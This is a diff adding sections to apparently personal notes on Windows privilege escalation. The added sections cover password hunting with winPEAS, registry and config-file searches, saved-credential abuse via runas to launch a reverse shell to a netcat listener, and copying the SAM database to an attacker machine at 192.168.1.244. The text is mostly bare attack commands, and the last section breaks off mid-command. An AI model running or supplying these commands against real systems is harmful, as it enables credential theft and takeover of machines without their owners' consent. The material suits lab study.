@@ -244,5 +244,90 @@ copy \\192.168.1.244\tools\reverse.msi .
 run the reverse shell on the victim machine:
 msiexec /quiet /qn /i reverse.msi
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+                                                                          PASSWORDS
+                                                                          
+seraching for passwords with winpeas:
+winPEASany.exe quiet filesinfo userinfo
+
+once a password is found we can use winexe command to spawn a shell:
+winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+
+this command will query the registry for passwords
+reg query HKLM /f password /t REG_SZ /s
+
+                                                                          Saved Creds
+use winpeas to search for stored passwords/credntials:
+winPEASany.exe quiet cmd windowscreds
+
+confirm is the password is in fact stored:
+cmdkey /list
+
+set up a listner on kali:
+nc -nlvp 1337
+
+we can use the saved admin cred we want to run any command as the admin user:
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+                                                                     configuration files
+                                                                     
+Recursively search for files in the current directory with "pass" in the name, or ending in ".config"
+dir /s *pass* == *.config
+
+Recursively serch for files in the current directory that contain the ord "password" and also end in either .xml, .ini, or .txt
+findstr /si password *.xml *.ini *.txt
+
+search for passwords in configuration files with WinPeas:
+winPEASany.exe quiet cmd searchfast filesinfo
+
+                                                                            SAM
+                                                                            
+copy the SAM files back to kali:
+copy C:\Windows\Repair\SAM \\192.168.1.244\tools\
+
+copy the SAM files back to kali:
+copy C:\Windows
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
